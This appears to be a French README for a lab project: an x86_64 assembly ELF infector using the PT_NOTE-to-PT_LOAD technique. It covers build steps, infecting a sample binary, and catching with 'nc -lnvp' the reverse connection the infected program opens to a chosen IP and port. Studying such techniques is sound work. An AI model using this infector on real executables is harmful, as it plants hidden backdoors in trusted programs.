# pt_note-pt_load-asm

Infection d'ELF via la méthode PT_NOTE → PT_LOAD, écrit en pur assembleur x86_64 (NASM).

Il n'est **pas** nécessaire de désactiver l'ASLR.
Le programme parcourt dynamiquement les program headers de la cible pour trouver le segment PT_NOTE.
L'**IP** et le **port** sont demandés interactivement au lancement de l'infecteur.

Fonctionne sur les ELF compilés avec `-no-pie`.

## Prérequis

- **Linux x86_64** : `nasm`, `ld`, `gcc`
- **Mac (Apple Silicon)** : Docker Desktop installé et lancé

## Compilation sur Mac (via Docker)

```bash
# Build de l'image (une seule fois)
docker build -t asmlab .

# Shell interactif dans l'environnement
docker run --rm -it -v "$PWD":/work asmlab bash
```

## Compilation (Linux x86_64 ou dans le conteneur)

```bash
make
```

Ou manuellement :
```bash
nasm -f elf64 -o main/pt_note_to_pt_load_infector.o main/pt_note_to_pt_load_infector.s
ld -o main/pt_note_to_pt_load_infector main/pt_note_to_pt_load_infector.o
gcc -no-pie saine-code/safe_code.c -o saine-code/safe_code
```

## Utilisation

Lancer l'infecteur en lui passant le binaire cible :
```bash
./main/pt_note_to_pt_load_infector saine-code/safe_code
```

L'infecteur demande :
1. L'IP cible (ex `127.0.0.1`)
2. Le port cible (ex `4444`)

## Vérifier la connexion

Terminal 1 — listener :
```bash
nc -lnvp 4444
```

Terminal 2 — exécuter le binaire infecté :
```bash
./saine-code/safe_code
```

Le binaire se connecte à l'IP:port spécifiés, puis s'exécute normalement.
